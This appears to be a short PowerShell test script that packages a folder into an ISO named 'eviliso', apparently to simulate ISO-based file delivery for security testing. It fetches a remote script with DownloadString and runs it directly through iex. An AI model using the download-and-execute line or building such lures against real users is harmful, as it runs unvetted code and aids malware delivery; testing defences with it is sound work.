# source: https://gist.githubusercontent.com/mgraeber-rc/a780834c983bc0d53121c39c276bd9f3/raw/94e9e4b685f03bb0dadc5a6516948c1c55c5e080/SimulateInternetZoneTest.ps1

# Usage:
# 1) create a directory and populate its contents with files intended to be enclosed in the ISO/IMG
# 2) configure the image name, parcel title, and iso directory
# 3) run
$eviliso = "Documents.iso"
$isodir = "Documents"
$parceltitle = "Documents"

# Create an ISO file from the $isodir directory.
(New-Object net.webclient).DownloadString('https://raw.githubusercontent.com/wikijm/PowerShell-AdminScripts/master/Miscellaneous/New-IsoFile.ps1')|iex
ls -Force $isodir | New-IsoFile -Path $eviliso -Media CDR -Title $parceltitle
